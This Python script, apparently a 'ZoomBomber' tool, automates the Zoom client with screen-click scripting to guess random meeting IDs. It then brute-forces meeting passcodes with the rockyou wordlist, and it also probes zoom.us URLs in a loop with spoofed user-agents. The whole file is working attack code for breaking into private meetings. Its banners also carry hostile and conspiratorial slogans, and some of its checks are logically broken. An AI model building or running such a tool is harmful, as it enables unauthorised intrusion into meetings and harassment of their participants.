import os
import pyautogui
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import random
import numpy as np
from time import sleep
from pyfiglet import Figlet
from colorama import *
import requests


class ZoomBomber:
    def __init__(self):
        f = Figlet()
        print(Fore.BLUE + f.renderText('ShameOnYou'))
        print(Fore.YELLOW + Back.BLUE+'[+] Zoom Meeting ID Brute Forcer Module by Muneeb Ahmad (C) MIT 2021')
        print('[+] We are Ottomans, we are a Legion, we do not forgive, we do not forget, Expect US!')
        self.Windows_Button = pyautogui.locateOnScreen('./Windows_Button.png')
        if self.Windows_Button == None:
            self.Windows_Button = pyautogui.locateOnScreen('./Windows_Button_2.png')
        pyautogui.click(self.Windows_Button)
        pyautogui.typewrite('Zoom')
        pyautogui.press('enter')
        pyautogui.press('enter')
        print(Fore.RED +'[+] Zoom Opened' + Fore.GREEN + '- Success')
        self.open_meeting = pyautogui.locateOnScreen('./Open_Meeting.png')
        print(f'Open Meeting Found on {self.open_meeting}')
        while None == self.open_meeting:
            print(Fore.LIGHTWHITE_EX + 'Zoom Join Meeting Not Found on' + Back.GREEN+ 'Screen')
            self.open_meeting = pyautogui.locateOnScreen('./Open_Meeting.png')
        pyautogui.click(self.open_meeting)
    def generate_link(self,type=11):
        # Debug Module - Link Generation Algorithm Information.
        if type == 9:
            print(Back.LIGHTCYAN_EX + 'You are using module'+ Fore.BLUE +':personal_meeting_old standard')
        elif type == 10:
            print(Back.LIGHTCYAN_EX + 'You are using module'+ Fore.BLUE +':personal_meeting_new')
        elif type == 11:
            print(Back.LIGHTCYAN_EX + 'You are using module'+ Fore.BLUE +':scheduled_meeting')
        # This Function Generates a Link to Try to Test the Zoom Meeting
        numbers = np.arange(0,10,1)
        self.meeting_code = ''
        # Meeting ID Generation Info 3 Modes for Brute Forcing - :)
        self.meetings_dict = {
            'personal_meeting_old':9,
            'personal_meeting_new':10,
            'scheduled_meeting':11
        }
        for x in range(type):
            s = str(random.choice(numbers))
            self.meeting_code = self.meeting_code + s
        print(self.meeting_code)
        return self.meeting_code
    def check_link(self, link):
        # Checks the Link Passed
        try:
            join_again_case = pyautogui.locateOnScreen('./Open_Meeting.png')
            pyautogui.click(join_again_case)
        except:
            print(Fore.RED + Back.BLUE +'[+] Seems Like it is First RUN')
        self.enter_meeting = pyautogui.locateOnScreen('./Enter-Meeting.png')
        while self.enter_meeting == None:
            self.enter_meeting = pyautogui.locateOnScreen('./Enter-Meeting.png')
            print(f'Enter Meeting Status on Screen {self.enter_meeting}')
            invalid_id = pyautogui.locateOnScreen('./Invalid_ID.png')
            if invalid_id != None:

                ok_loc_e = pyautogui.locateOnScreen('./Ok_Button.png')
                while ok_loc_e == None:
                    ok_loc_e = pyautogui.locateOnScreen('./Ok_Button.png')
                pyautogui.click(ok_loc_e)
                join_meeting_ez = pyautogui.locateOnScreen('./join-meeting.png')
                while join_meeting_ez == None:
                    join_meeting_ez = pyautogui.locateOnScreen('./join-meeting.png')
                pyautogui.click(join_meeting_ez)


        pyautogui.click(self.enter_meeting)
        pyautogui.typewrite(f'{link}')
        pyautogui.press('enter')
        print(Fore.RED + Back.GREEN +'[+] Now Sleeping for 8 Seconds :)')
        sleep(8)
        try:
            self.invalid_loc = pyautogui.locateOnScreen('./Invalid_ID_Force.png')
            if self.invalid_loc != None:
                ok_location = pyautogui.locateOnScreen('./Ok_Button.png')
                pyautogui.click(ok_location)
                return False
        except:
            self.invalid_loc = pyautogui.locateOnScreen('./Invalid_ID.png')
            if self.invalid_loc != None:
                ok_location = pyautogui.locateOnScreen('./Ok_Button.png')
                pyautogui.click(ok_location)
                return False

        print('[+] Correct Meeting ID Found - Failsafe unactivated')
        active_titles = pyautogui.getAllTitles()
        if 'Enter meeting password' or 'meeting password' in active_titles:
            with open('Zoom-Meetings.txt', 'a+') as f:
                f.write(f'{link}:pswd\n')
                return True

        let_u_in = pyautogui.locateOnScreen('./Let-u-in.png')
        if let_u_in != None:
            with open('Zoom-Meetings.txt', 'a+') as f:
                f.write(f'{link}:no_pswd\n')
                return True
    def brute_force_link(self, meeting_id, dict='./rockyou.txt'):
        print('[+] Starting to BruteForce Meeting ID : ')
        open_meeting_loc = pyautogui.locateOnScreen('./Open_Meeting.png')
        pyautogui.click(open_meeting_loc)
        self.enter_meeting = pyautogui.locateOnScreen('./Enter-Meeting.png')
        pyautogui.click(self.enter_meeting)
        pyautogui.typewrite(f'{meeting_id}')
        pyautogui.press('enter')
        if 'Enter meeting passcode' in pyautogui.getAllTitles():
            Bruter = Figlet()
            Bruter.renderText('Ottoman-Bruter')
            print('[+] Sultan Abdul Hamid Han II - May God Almighty bless his soul and those martyrs who fought for the Caliphate Against the Young Turks and the Free Masons and Iluminati.')
            print('[+] Ottoman Motto: Fight against those who Oppress and Protect those who are Oppressed from the Oppressors')
            print('[+] Ottoman-Bruter Forcer Started')
            if dict == './rockyou.txt':
                print('[+] Using Default RockYou Password Dictionary [Fuck the Byzantines, aka. British]')
            else:
                print('[*] Remember Dict should be of the Format:\n guess1\nguess2\nguess3\n')
            with open(dict, 'r', encoding='utf8', errors='ignore') as f:
                guess = f.read()
                self.guess = guess.split('\n')
                print(f'Password Guesses Loaded: {len(self.guess)}')
            let_u_in = pyautogui.locateOnScreen('./Let-u-in.png')
            while let_u_in == None:
                password_entry_location = pyautogui.locateOnScreen('./passcode.png')
                if password_entry_location == None:
                    print('[**] Strange Anomaly Detected there is no Password Entry Box on the Screen')
                    print('[**] Please Bring it up on the Screen for the Program to Continue')
                    while password_entry_location == None:
                        password_entry_location = pyautogui.locateOnScreen('./passcode.png')
                else:
                    pyautogui.click(password_entry_location)

                for password in self.guess:
                    print(f'[?] Trying Password: {password}')
                    pyautogui.typewrite(password)
                    join_meeting_button = pyautogui.locateOnScreen('./join-meeting.png')
                    pyautogui.click(join_meeting_button)
                    sleep(8)
                    check_fail_1 = pyautogui.locateOnScreen('./failed-attempt.png')
                    if check_fail_1 == None:
                        let_u_in = pyautogui.locateOnScreen('./Let-u-in.png')
                        if let_u_in != None:
                            print(f'[+] Password Found Now in Waiting Room - Password is {password} for ID {meeting_id}')
                            with open('works.txt', 'a+') as f:
                                f.write(f'{meeting_id}:{password}\n')
                                break

            print('Ottoman Brute Forcer Completed Execution')
            print('Allah is the Greatest ....')
    def Zoom_Requests_Gen(self,go_crazy=False):
        # Took this Code from
        os.system('cls' if os.name == 'nt' else 'clear')

        # Data
        headers = {"User-Agent": ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"]}
        # Adding sooo many user-agents thats it too much overkitt even for a ddoser hehe
        # Good Luck Zoomers Hehehe, Boomers Win !!!
        # If ur from Zoom and Reading this, please forgive me, I had to do it hehe
        # Do not be a cry baby be a Man or a Women.
        with open('./user-agents.txt', 'r', encoding='utf8') as f:
            data = f.read()
        # Appending that to the headers
        if go_crazy == True:
            for element in data:
                headers['User-Agent'].append(element)
        # Brute Force Operation
        reqSession = requests.session()
        errorMsg = "This meeting link is invalid"

        print(Fore.YELLOW + "[+] 3x0c | Zoom Meeting URL Brute Force")
        print(Fore.YELLOW + "[+] Brute Forcing...\n\n" + Fore.RESET)

        try:
            while True:
                meeting_id = random.randint(00000000000, 99999999999)
                url = "https://zoom.us/wc/" + str(meeting_id) + "/start"
                response = reqSession.get(url, data=headers)
                # time.sleep(0.1) # Threads
                if not errorMsg in response.text:
                    print(Fore.RED + "[+] Bad " + url)
                else:
                    print(Fore.WHITE + "[+] Good " + url)
                    with open('Zoom-Meetings.txt', 'a+') as ree:
                        ree.write(f'{meeting_id}:unknown')
                        return meeting_id
        except KeyboardInterrupt:
            print(Fore.RED + "Exiting...")






if __name__ == '__main__':
    Bomber = ZoomBomber()
    while True:
        Link = Bomber.generate_link(10)
        Link_Status = Bomber.check_link(Link)
        if Link_Status == True:
            print(f'[?] This Link Works {Link}')
            print('[+] Stopping Code Execution Now')
            Bomber.brute_force_link(Link)

